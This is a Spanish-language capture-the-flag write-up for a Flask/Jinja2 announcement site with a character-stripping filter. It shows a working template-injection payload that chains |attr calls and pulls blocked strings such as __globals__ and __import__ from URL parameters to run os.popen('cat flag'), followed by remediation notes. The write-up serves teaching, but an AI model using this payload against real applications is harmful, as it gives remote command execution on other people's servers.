## Descripción
I built a cool website that lets you announce whatever you want! Can you find the flag? This time with added sanitization!

## Solución
- Accedemos al sitio web, el cual presenta la misma interfaz de anuncios que el reto anterior
- Al realizar pruebas de inyección identificamos que el servidor implementa un filtro de sanitización sobre el campo `content` que elimina caracteres críticos:
  - Elimina los guiones bajos (`_`)
  - Elimina los puntos (`.`)
  - Elimina los corchetes (`[` y `]`)
- Para superar estas restricciones combinamos las siguientes técnicas de Jinja2 y Flask:
  1. **Evitar puntos**: Usamos el filtro de atributos de Jinja2: `objeto|attr("nombre")` en lugar de `objeto.nombre`
  2. **Evitar corchetes**: Para acceder a diccionarios usamos el método `.get()`: `diccionario|attr("get")("clave")` en lugar de `diccionario["clave"]`
  3. **Evasión de caracteres mediante `request.args`**: La sanitización solo se aplica sobre el cuerpo de la petición POST (`content`). Los parámetros pasados en la URL (`request.args`) no sufren este filtro, lo que nos permite enviar las cadenas con guiones bajos intactas desde la URL
- Enviamos los argumentos prohibidos como parámetros de consulta en la URL:
  - `a=__init__`
  - `b=__globals__`
  - `c=__builtins__`
  - `d=__import__`
  - `cmd=cat flag`
- En el cuerpo del POST enviamos el payload que referencia dichos parámetros a través del objeto `request`:
  ```jinja2
  {{ self|attr(request|attr("args")|attr("get")("a"))|attr(request|attr("args")|attr("get")("b"))|attr("get")(request|attr("args")|attr("get")("c"))|attr("get")(request|attr("args")|attr("get")("d"))("os")|attr("popen")(request|attr("args")|attr("get")("cmd"))|attr("read")() }}
  ```
- El servidor procesa la plantilla, obtiene los valores sin filtrar desde la URL, invoca `os.popen('cat flag')` e imprime la bandera:

```text
academy{sst1_f1lt3r_byp4ss_26c3eb41}
```

## Notas Adicionales
- **Inseguridad de las Listas Negras (Blacklist Bypasses)**: Las defensas basadas en eliminar caracteres específicos suelen ser insuficientes en motores de plantillas como Jinja2, dado que el lenguaje ofrece múltiples formas de invocar atributos y métodos (`attr()`, `get()`, etc.).
- **Desvío de fuentes de datos mediante `request`**: El objeto `request` de Flask contiene múltiples colecciones no sanitizadas (como `request.args`, `request.headers` o `request.cookies`). Inyectar referencias a estos atributos permite introducir cualquier carácter bloqueado sin que pase por el filtro del formulario.
- **Remediación Correcta**: La solución adecuada frente a SSTI no consiste en filtrar caracteres, sino en evitar que la entrada del usuario se evalúe como plantilla, utilizando siempre plantillas estáticas con variables de contexto.

## Referencias
- [PortSwigger - Bypassing SSTI filters](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks - Jinja2 SSTI Filter Bypasses](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#filter-bypasses)
- [OWASP - Server Side Template Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.html)